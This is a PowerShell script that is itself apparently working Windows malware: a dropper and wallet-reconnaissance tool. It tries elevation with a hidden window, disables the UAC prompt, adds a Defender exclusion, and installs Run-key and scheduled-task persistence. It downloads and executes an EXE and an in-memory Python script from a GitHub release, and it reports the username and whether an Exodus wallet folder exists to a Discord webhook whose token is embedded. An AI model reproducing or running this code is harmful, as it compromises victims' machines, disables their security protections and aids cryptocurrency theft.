# Initialize variables
$webhookUrl = "https://discord.com/api/webhooks/1410962330300321834/9siRJ2eeQ-3gaV1Ma3r7akXbqZfdHrYG8owFAmySTUkdVVrH8pTFIehfXk87z9A9HuzR"
$logPath = Join-Path $env:USERPROFILE "Documents\winlog.log"
$fallbackLogPath = Join-Path $env:TEMP "winlog_fallback.log"

# Function to send log to webhook, primary file, fallback file, and console
function Send-Log {
    param (
        [string]$message
    )
    $timestamp = Get-Date -Format 'yyyy-MM-dd HH:mm:ss'
    $logMessage = "[$timestamp] $message"

    # Log to console for immediate feedback
    Write-Host $logMessage

    # Log to primary file
    try {
        $logMessage | Out-File -FilePath $logPath -Append -ErrorAction Stop
    }
    catch {
        Write-Host "[$timestamp] Failed to write to primary log ($logPath): $($_.Exception.Message)"
        try {
            "[$timestamp] Failed to write to primary log ($logPath): $($_.Exception.Message)" | Out-File -FilePath $fallbackLogPath -Append
        }
        catch {
            Write-Host "[$timestamp] Failed to write to both primary and fallback logs: $($_.Exception.Message)"
        }
    }

    # Log to fallback file for redundancy
    try {
        $logMessage | Out-File -FilePath $fallbackLogPath -Append -ErrorAction Stop
    }
    catch {
        Write-Host "[$timestamp] Failed to write to fallback log ($fallbackLogPath): $($_.Exception.Message)"
    }

    # Log to webhook
    $body = @{ content = $logMessage } | ConvertTo-Json
    $attempt = 0
    $success = $false
    while (-not $success -and $attempt -lt 3) {
        try {
            Invoke-RestMethod -Uri $webhookUrl -Method Post -Body $body -ContentType 'application/json' -ErrorAction Stop
            $success = $true
        }
        catch {
            $attempt++
            $errorDetails = "Webhook attempt $attempt failed: $($_.Exception.Message)"
            Write-Host "[$timestamp] $errorDetails"
            try {
                "[$timestamp] $errorDetails" | Out-File -FilePath $logPath -Append
                "[$timestamp] $errorDetails" | Out-File -FilePath $fallbackLogPath -Append
            }
            catch {
                Write-Host "[$timestamp] Failed to log webhook error: $($_.Exception.Message)"
            }
            if ($_.Exception.Response.StatusCode -eq 429) {
                $retryAfter = [int]$_.Exception.Response.Headers['Retry-After']
                if ($retryAfter -gt 0) {
                    Start-Sleep -Seconds $retryAfter
                }
                else {
                    Start-Sleep -Seconds (5 * $attempt)  # Fallback exponential backoff
                }
            }
            else {
                Start-Sleep -Seconds (5 * $attempt)
            }
            if ($attempt -eq 3) {
                try {
                    "[$timestamp] Failed to send webhook message after 3 attempts: $($_.Exception.Message)" | Out-File -FilePath $logPath -Append
                    "[$timestamp] Failed to send webhook message after 3 attempts: $($_.Exception.Message)" | Out-File -FilePath $fallbackLogPath -Append
                }
                catch {
                    Write-Host "[$timestamp] Failed to log final webhook failure: $($_.Exception.Message)"
                }
            }
        }
    }
}

# Log script start
Send-Log "Script started"

# Validate environment
try {
    Send-Log "Checking write access to Documents folder"
    "Test" | Out-File -FilePath (Join-Path $env:USERPROFILE "Documents\test.log") -ErrorAction Stop
    Remove-Item -Path (Join-Path $env:USERPROFILE "Documents\test.log") -ErrorAction SilentlyContinue
    Send-Log "Write access to Documents folder confirmed"
}
catch {
    Send-Log "No write access to Documents folder: $($_.Exception.Message)"
}
try {
    Send-Log "Checking write access to TEMP folder"
    "Test" | Out-File -FilePath (Join-Path $env:TEMP "test.log") -ErrorAction Stop
    Remove-Item -Path (Join-Path $env:TEMP "test.log") -ErrorAction SilentlyContinue
    Send-Log "Write access to TEMP folder confirmed"
}
catch {
    Send-Log "No write access to TEMP folder: $($_.Exception.Message)"
}
try {
    Send-Log "Checking network connectivity to webhook"
    $null = Invoke-WebRequest -Uri $webhookUrl -Method Get -UseBasicParsing -ErrorAction Stop
    Send-Log "Network connectivity to webhook confirmed"
}
catch {
    Send-Log "No network connectivity to webhook: $($_.Exception.Message)"
}

# Check if running as admin and attempt elevation
$isAdmin = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
if (-not $isAdmin) {
    Send-Log "Not running as admin, attempting elevation"
    try {
        $process = Start-Process powershell.exe -ArgumentList "-NoProfile -ExecutionPolicy Bypass -Command `"& { $($MyInvocation.MyCommand.Definition) }`"" -Verb RunAs -WindowStyle Hidden -PassThru
        Send-Log "Launched elevated instance with process ID: $($process.Id)"
        # Wait briefly to check if the process started successfully
        Start-Sleep -Seconds 2
        if ($process.HasExited) {
            Send-Log "Elevated instance failed to start or exited prematurely"
            Send-Log "Continuing without admin rights due to elevation failure"
        }
        else {
            Send-Log "Elevated instance started successfully, exiting non-elevated script"
            exit 0  # Exit only if the elevated process is running
        }
    }
    catch {
        Send-Log "Failed to elevate privileges: $($_.Exception.Message)"
        Send-Log "Continuing without admin rights"
    }
}
else {
    Send-Log "Running with admin privileges"
}

# Initialize variables
$installFolder = Join-Path $env:APPDATA "SystemConfig"
$exePath = Join-Path $installFolder "scripthelper.exe"
$exeUrl = "https://github.com/skiddyskid111/resources/releases/download/adadad/scripthelper.exe"
$pythonScriptUrl = "https://github.com/skiddyskid111/resources/releases/download/adadad/1.pyw"
$maxRetries = 3
$baseDelay = 1000
$maxDelay = 10000

# Validate URLs
try {
    Send-Log "Checking accessibility of exeUrl: $exeUrl"
    $null = Invoke-WebRequest -Uri $exeUrl -Method Head -UseBasicParsing -ErrorAction Stop
    Send-Log "exeUrl is accessible"
}
catch {
    Send-Log "exeUrl is not accessible: $($_.Exception.Message)"
}
try {
    Send-Log "Checking accessibility of pythonScriptUrl: $pythonScriptUrl"
    $null = Invoke-WebRequest -Uri $pythonScriptUrl -Method Head -UseBasicParsing -ErrorAction Stop
    Send-Log "pythonScriptUrl is accessible"
}
catch {
    Send-Log "pythonScriptUrl is not accessible: $($_.Exception.Message)"
}

# Simplified retry function with exponential backoff
function Invoke-Retry {
    param (
        [ScriptBlock]$Action
    )
    $retryCount = 0
    while ($retryCount -lt $maxRetries) {
        try {
            & $Action
            return
        }
        catch {
            $retryCount++
            $errorDetails = "Retry attempt $retryCount failed: $($_.Exception.Message)"
            Send-Log $errorDetails
            if ($retryCount -eq $maxRetries) {
                Send-Log "Action failed after $maxRetries retries: $($_.Exception.Message)"
                return
            }
            $delay = [math]::Min($baseDelay * [math]::Pow(2, $retryCount), $maxDelay)
            Start-Sleep -Milliseconds $delay
        }
    }
}

# Create and hide install folder
try {
    Send-Log "Attempting to create install folder: $installFolder"
    if (-not (Test-Path $installFolder)) {
        New-Item -Path $installFolder -ItemType Directory -Force | Out-Null
        Set-ItemProperty -Path $installFolder -Name Attributes -Value ([System.IO.FileAttributes]::Hidden) -ErrorAction SilentlyContinue
        Send-Log "Created and hid install folder: $installFolder"
    }
    else {
        Send-Log "Install folder already exists: $installFolder"
    }
}
catch {
    Send-Log "Failed to create or hide install folder: $($_.Exception.Message)"
}

# Disable UAC prompt (requires admin)
try {
    Send-Log "Attempting to disable UAC prompt"
    Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" -Name "ConsentPromptBehaviorAdmin" -Value 0 -ErrorAction Stop
    Send-Log "Disabled UAC prompt"
}
catch {
    Send-Log "Failed to disable UAC prompt (admin required): $($_.Exception.Message)"
}

# Add Windows Defender exclusion for the install folder (requires admin)
try {
    Send-Log "Attempting to add Defender exclusion for $installFolder"
    Invoke-Retry {
        $exclusions = Get-MpPreference -ErrorAction SilentlyContinue | Select-Object -ExpandProperty ExclusionPath
        if ($exclusions -notcontains $installFolder) {
            Add-MpPreference -ExclusionPath $installFolder -ErrorAction Stop
            Send-Log "Added Defender exclusion for $installFolder"
        }
        else {
            Send-Log "Defender exclusion already exists for $installFolder"
        }
    }
}
catch {
    Send-Log "Failed to add Defender exclusion (admin required): $($_.Exception.Message)"
}

# Add EXE to startup registry (requires admin)
try {
    Send-Log "Attempting to add registry startup entry for $exePath"
    $regPath = "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"
    $regName = "ScriptHelper"
    $regValue = "`"$exePath`""
    if (-not (Get-ItemProperty -Path $regPath -Name $regName -ErrorAction SilentlyContinue)) {
        New-ItemProperty -Path $regPath -Name $regName -Value $regValue -PropertyType String -ErrorAction Stop
        Send-Log "Added registry startup entry for $exePath"
    }
    else {
        Send-Log "Registry startup entry already exists for $exePath"
    }
}
catch {
    Send-Log "Failed to add registry startup entry (admin required): $($_.Exception.Message)"
}

# Create scheduled task for EXE (requires admin)
try {
    Send-Log "Attempting to create scheduled task: ScriptHelperTask"
    $taskName = "ScriptHelperTask"
    if (-not (Get-ScheduledTask -TaskName $taskName -ErrorAction SilentlyContinue)) {
        $action = New-ScheduledTaskAction -Execute $exePath
        $trigger = New-ScheduledTaskTrigger -AtLogOn
        $principal = New-ScheduledTaskPrincipal -GroupId "Users" -RunLevel Highest
        $settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -Hidden
        Register-ScheduledTask -TaskName $taskName -Action $action -Trigger $trigger -Principal $principal -Settings $settings -Description "Script Helper Task" -ErrorAction Stop
        Send-Log "Created scheduled task: $taskName"
    }
    else {
        Send-Log "Scheduled task already exists: $taskName"
    }
}
catch {
    Send-Log "Failed to create scheduled task (admin required): $($_.Exception.Message)"
}

# Download and execute scripthelper.exe
$webClient = $null
try {
    Send-Log "Attempting to download and execute $exePath from $exeUrl"
    Invoke-Retry {
        $webClient = New-Object System.Net.WebClient
        $webClient.DownloadFile($exeUrl, $exePath)
        if (Test-Path $exePath) {
            Start-Process -FilePath $exePath -WindowStyle Hidden -Wait
            Send-Log "Successfully downloaded and executed $exePath"
        }
        else {
            throw "File not found at $exePath"
        }
    }
}
catch {
    Send-Log "Failed to download or execute scripthelper.exe: $($_.Exception.Message)"
}
finally {
    if ($webClient) {
        $webClient.Dispose()
        Send-Log "Disposed WebClient for scripthelper.exe download"
    }
}

# Execute Python script in memory
try {
    Send-Log "Checking for Python installation"
    $null = python --version 2>&1
    if ($LASTEXITCODE -eq 0) {
        Send-Log "Python found, attempting to execute Python script from $pythonScriptUrl"
        Invoke-Retry {
            $webClient = New-Object System.Net.WebClient
            $webClient.Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) PowerShell/7.0")
            $pythonScriptContent = $webClient.DownloadString($pythonScriptUrl)
            if ($pythonScriptContent) {
                $processInfo = New-Object System.Diagnostics.ProcessStartInfo
                $processInfo.FileName = "python"
                $processInfo.Arguments = "-"
                $processInfo.RedirectStandardInput = $true
                $processInfo.UseShellExecute = $false
                $processInfo.CreateNoWindow = $true
                $process = [System.Diagnostics.Process]::Start($processInfo)
                $process.StandardInput.Write($pythonScriptContent)
                $process.StandardInput.Close()
                $process.WaitForExit(30000)
                Send-Log "Successfully executed Python script"
            }
            else {
                throw "Failed to download Python script content"
            }
        }
    }
    else {
        Send-Log "Python not found, skipping Python script execution"
    }
}
catch {
    Send-Log "Failed to execute Python script: $($_.Exception.Message)"
}
finally {
    if ($webClient) {
        $webClient.Dispose()
        Send-Log "Disposed WebClient for Python script download"
    }
    if ($process) {
        $process.Dispose()
        Send-Log "Disposed Python process"
    }
}

# Check for Exodus folder and send Discord webhook notification
try {
    Send-Log "Checking for Exodus folder: $path"
    $path = "C:\Users\admin\AppData\Roaming\Exodus"
    $user = $env:USERNAME
    $msg = if (Test-Path $path) { "@everyone Exists! User: $user" } else { "Does not Exist! User: $user" }
    $body = @{ content = $msg } | ConvertTo-Json
    Invoke-RestMethod -Uri $webhookUrl -Method Post -Body $body -ContentType 'application/json'
    Send-Log "Sent Discord webhook notification: $msg"
}
catch {
    Send-Log "Failed to send Discord webhook: $($_.Exception.Message)"
}

# Log script completion
Send-Log "Script completed"
